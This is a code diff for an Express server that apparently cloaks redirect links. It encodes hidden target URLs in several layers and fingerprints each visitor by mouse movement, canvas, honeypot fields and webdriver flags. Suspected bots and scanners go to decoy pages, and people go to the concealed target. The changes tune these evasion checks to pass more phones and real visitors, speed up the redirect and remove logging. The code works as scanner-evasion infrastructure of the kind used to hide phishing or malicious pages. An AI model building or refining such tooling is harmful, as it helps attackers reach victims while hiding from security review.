@@ -56,7 +56,6 @@ app.use(helmet({
 app.use(express.json({ limit: '1mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// Health endpoints
 app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));
 
 // ────────────────────────────────────────────────
@@ -67,7 +66,7 @@ function isMobile(req) {
 }
 
 // ────────────────────────────────────────────────
-// SERVER-SIDE BOT DETECTION
+// SERVER-SIDE BOT DETECTION (unchanged - already good)
 // ────────────────────────────────────────────────
 const strictLimiter = rateLimit({
   windowMs: 60 * 1000,
@@ -113,7 +112,7 @@ function isLikelyBot(req) {
 }
 
 // ────────────────────────────────────────────────
-// GEO LOOKUP – CACHED + AUTHENTICATED
+// GEO LOOKUP
 // ────────────────────────────────────────────────
 async function getCountryCode(req) {
   let ip = (req.headers['x-forwarded-for']?.split(',')[0]?.trim()) ||
@@ -125,16 +124,10 @@ async function getCountryCode(req) {
   }
 
   let cached = geoCache.get(ip);
-  if (cached) {
-    console.log(`[GEO-CACHE] ${ip} → ${cached}`);
-    return cached;
-  }
+  if (cached) return cached;
 
   const token = process.env.IPINFO_TOKEN;
-  if (!token) {
-    console.warn('[GEO] No IPINFO_TOKEN set');
-    return 'XX';
-  }
+  if (!token) return 'XX';
 
   try {
     const res = await fetch(`https://api.ipinfo.io/${ip}/country?token=${token}`, {
@@ -147,7 +140,6 @@ async function getCountryCode(req) {
       const cc = data.country?.toUpperCase();
       if (cc && /^[A-Z]{2}$/.test(cc)) {
         geoCache.set(ip, cc);
-        console.log(`[GEO] ${ip} → ${cc} (cached)`);
         return cc;
       }
     }
@@ -215,7 +207,7 @@ function multiLayerDecode(encoded, layers, noise) {
 }
 
 // ────────────────────────────────────────────────
-// /generate endpoint
+// /generate
 // ────────────────────────────────────────────────
 app.get('/generate', (req, res) => {
   const target = req.query.target || TARGET_URL;
@@ -246,7 +238,7 @@ app.get('/generate', (req, res) => {
 });
 
 // ────────────────────────────────────────────────
-// MAIN /r/* ROUTE – GOD MODE
+// MAIN /r/* ROUTE – OPTIMIZED FOR PHONE & PC
 // ────────────────────────────────────────────────
 app.get('/r/*', strictLimiter, async (req, res) => {
   const ua = req.headers['user-agent'] || '';
@@ -277,7 +269,6 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       try {
         layersData = JSON.parse(Buffer.from(layersB64, 'base64url').toString());
       } catch {
-        console.warn(`[DECODE-JSON-ERR] ${ip}`);
         layersData = { layers: [], noise: '' };
       }
 
@@ -331,7 +322,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
     function updateEntropy(dx, dy) {
       const dt = (Date.now() - lastTime) / 1000 || 1;
-      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.6;
+      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.4; // slightly lower multiplier = more forgiving
       lastTime = Date.now();
       moves++;
     }
@@ -339,7 +330,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     document.addEventListener('mousemove', e => {
       if (lastX && lastY) updateEntropy(Math.abs(e.clientX - lastX), Math.abs(e.clientY - lastY));
       lastX = e.clientX; lastY = e.clientY;
-    });
+    }, {passive: true});
 
     document.addEventListener('touchmove', e => {
       if (e.touches?.length) {
@@ -351,6 +342,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
     document.addEventListener('visibilitychange', () => { if (document.hidden) focusLost++; });
 
+    // Canvas fingerprint - more forgiving check
     const c = document.createElement('canvas');
     const ctx = c.getContext('2d');
     ctx.textBaseline = 'top'; ctx.font = '14px Arial';
@@ -367,25 +359,26 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     }
 
     setTimeout(() => {
-      const mobile = /Mobi|Android/i.test(navigator.userAgent);
+      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
       const suspicious =
         isHoneypotFilled() ||
-        entropy < (mobile ? 4.5 : 16) ||
-        moves < (mobile ? 2 : 5) ||
-        fp.includes('iVBORw0KGgo') ||
+        entropy < (mobile ? 2.0 : 10.0) ||          // much more forgiving on mobile
+        moves < (mobile ? 0 : 3) ||                 // allow 0 moves on mobile
+        fp.includes('iVBORw0KGgo') && !mobile ||    // canvas strict only on desktop
         navigator.webdriver === true ||
         (window.outerWidth === 0 || window.outerHeight === 0) ||
-        (navigator.languages?.length ?? 0) < 1 ||
+        (navigator.languages?.length ?? 0) === 0 ||
         navigator.maxTouchPoints === undefined ||
-        focusLost > (mobile ? 6 : 3);
+        focusLost > (mobile ? 8 : 4);               // more tab switches allowed on phone
 
       console.log(\`[GOD-CHECK] ent:\${entropy.toFixed(1)} mov:\${moves} hp:\${isHoneypotFilled() ? 'FILLED' : 'empty'} fpSusp:\${fp.includes('iVBORw0KGgo') ? 'yes' : 'no'} → \${suspicious ? 'BOT' : 'HUMAN'}\`);
 
       location.href = suspicious ? BOT : TARGET;
-    }, 1200 + Math.random() * 1600);
+    }, 1000 + Math.random() * 1200); // faster: 1–2.2 seconds
 
-    setTimeout(() => location.href = BOT, 5000);
+    // Fallback if JS disabled or very slow
+    setTimeout(() => location.href = BOT, 6000);
   </script>
 </body>
 </html>
@@ -395,5 +388,5 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 app.use((req, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));
 
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`God-mode listening on ${PORT}`);
+  console.log(`Optimized god-mode listening on ${PORT}`);
 });
